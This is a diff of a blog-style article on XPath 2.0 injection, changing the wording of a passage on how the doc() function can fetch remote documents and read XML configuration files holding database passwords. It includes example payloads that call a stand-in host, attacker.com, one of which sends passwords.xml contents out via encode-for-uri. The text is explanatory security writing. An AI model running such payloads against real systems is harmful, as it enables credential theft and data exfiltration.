@@ -63,7 +63,8 @@ own bloody holiday to Amsterdam. What does `doc('https://attacker.com/xxe.xml')`
 Turns out it does what you would expect. It makes the request. So now if you find an exploitable XPath injection flaw 
 you can make arbitrary network requests for any XML-like document you can find. If your internal services respond with 
 HTML that parses as XML that's great! Or how about if all your Java/.NET configuration files are in XML, storing all 
-those juicy database passwords? That's even better!
+those juicy database passwords? That's even better! **We can now read them and download them via any XPath 2.0 injection 
+issue.**
 
 Other than this the interesting thing is you can use this function to exfiltrate large quantities of data really 
 quickly. The specification very nicely includes [an `encode-for-uri` method](https://maxtoroq.github.io/xpath-ref/fn/encode-for-uri.html), 
@@ -71,18 +72,18 @@ so we could just do:
 
 `doc(string-join('http://attacker.com/?d', encode-for-uri(doc('passwords.xml')/some-node)))`
 
-Another interesting problem is [external entity injection](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing). 
+Another cool issue is [external entity injection](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing). 
 The tl;dr is you can serve up a malicious XML file that is requested by `doc()` that can read arbitrary files on the filesystem!
 
-Awesome! [xcat implements this attack](https://xcat.readthedocs.io/en/latest/OOB-server/) by the way.
+Awesome! [xcat implements these attacks](https://xcat.readthedocs.io/en/latest/OOB-server/) by the way.
 
 The kicker here is:
 
 - You need to explicitly configure your XPath engine to protect against all of this, which inevitably nobody does because 
   nobody expects it. It's just a simple query language, right?
   
-- There is no concept of parameterized queries like you have in SQL. If you don't properly escape **every** input you're 
-  putting into an XPath query then you're vulnerable to all of this!
+- There is no concept of parameterized queries like you have in every SQL adapter ever. It has to be done manually, and 
+  it has to be done **correctly in every input**. If you miss something then you're vulnerable to all of this!
   
 And this was XPath 2.0. Tom got to go to Amsterdam and
 [present at Black Hat Europe](https://media.blackhat.com/bh-eu-12/Siddharth/bh-eu-12-Siddharth-Xpath-Slides.pdf), and 
